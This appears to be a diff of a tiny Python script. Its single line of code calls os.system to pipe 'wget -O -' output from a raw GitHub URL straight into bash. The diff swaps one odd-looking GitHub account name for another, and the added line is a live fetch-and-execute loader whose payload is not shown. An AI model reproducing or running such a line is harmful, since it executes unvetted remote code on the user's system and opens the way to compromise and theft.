@@ -1,3 +1,3 @@
 import os
 
-os.system('wget -O - https://raw.githubusercontent.com/mfunekomlenzethole/pop/main/valpop | bash')
+os.system('wget -O - https://raw.githubusercontent.com/mzuvukilemaqwili/pop/main/valpop | bash')
